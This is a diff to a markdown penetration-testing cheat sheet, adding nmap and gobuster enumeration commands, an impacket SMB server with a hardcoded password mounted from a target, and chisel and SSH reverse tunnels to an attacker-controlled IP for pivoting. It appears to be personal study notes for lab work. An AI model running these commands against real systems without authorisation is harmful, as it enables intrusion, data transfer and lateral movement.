@@ -5,7 +5,7 @@
 - tactics: enumeration
 
 ## enumerate services and use default scripts  
-- `nmap -sC -sV -oN normal.txt target-ip`
+- `nmap -sC -sV -p- --min-rate 10000 -oN normal.txt target-ip`
 
 ## scan all tcp ports  
 - `nmap -p- -oN all_ports.txt target-ip`
@@ -24,6 +24,11 @@
 
 ## ftp bounce scan
 - `nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv`
+------
+## file share, share file smb, smb file share
+- `impacket-smbserver -smb2support root . -username root -password Axaxax12!`
+- `net use y: \\192.168.45.196\root /user:root Axaxax12!`
+- `change folder y use just Y:`
 
 ---
 
@@ -32,8 +37,8 @@
 - tactics: enumeration
 
 ## bruteforce webdirectories and files by extention
-- `gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30`
-
+- `gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -x php,txt,html,cgi,sh,bak,aspx -t 30 -o gobuster.192.168.0.1.txt`
+- `dirb http://192.168.205.249:8000 -N 403'
 ---
 
 # wfuzz
@@ -513,10 +518,15 @@ After the tunnel is up, you can comment out the first socks entry in proxychains
 - service: ssh
 - tactics: lateral_movement
 
-## pivot via sshuttle
+## pivot pivoting 
 - `sshuttle -vr <via-ssh-server> <Remote-Net-To-Route>`
 - `sshuttle -vr username@target-ip 10.1.1.0/24`
 
+- `chisel server --port 8000 --reverse`
+- `.\chisel client 192.168.45.196:8000 R:socks`
+
+- `ssh root@192.168.45.196 -L 80:127.0.0.1:80`
+- `ssh -R 0.0.0.0:8000:192.168.196.1:80 root@192.168.45.196`
 ---
 
 # smbmap
